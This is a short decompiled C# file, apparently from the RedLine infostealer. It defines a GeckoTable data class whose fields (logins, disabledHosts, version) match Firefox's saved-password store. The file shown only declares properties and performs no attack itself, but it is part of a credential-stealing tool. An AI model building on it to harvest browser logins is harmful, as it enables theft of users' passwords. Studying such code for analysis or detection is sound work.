using System;

namespace RedLine.Models.Gecko
{
	// Token: 0x02000037 RID: 55
	public class GeckoTable
	{
		// Token: 0x1700008C RID: 140
		// (get) Token: 0x06000168 RID: 360 RVA: 0x00004892 File Offset: 0x00002A92
		// (set) Token: 0x06000169 RID: 361 RVA: 0x0000489A File Offset: 0x00002A9A
		public int nextId { get; set; }

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x0600016A RID: 362 RVA: 0x000048A3 File Offset: 0x00002AA3
		// (set) Token: 0x0600016B RID: 363 RVA: 0x000048AB File Offset: 0x00002AAB
		public GeckoLogin[] logins { get; set; }

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x0600016C RID: 364 RVA: 0x000048B4 File Offset: 0x00002AB4
		// (set) Token: 0x0600016D RID: 365 RVA: 0x000048BC File Offset: 0x00002ABC
		public object[] disabledHosts { get; set; }

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x0600016E RID: 366 RVA: 0x000048C5 File Offset: 0x00002AC5
		// (set) Token: 0x0600016F RID: 367 RVA: 0x000048CD File Offset: 0x00002ACD
		public int version { get; set; }
	}
}
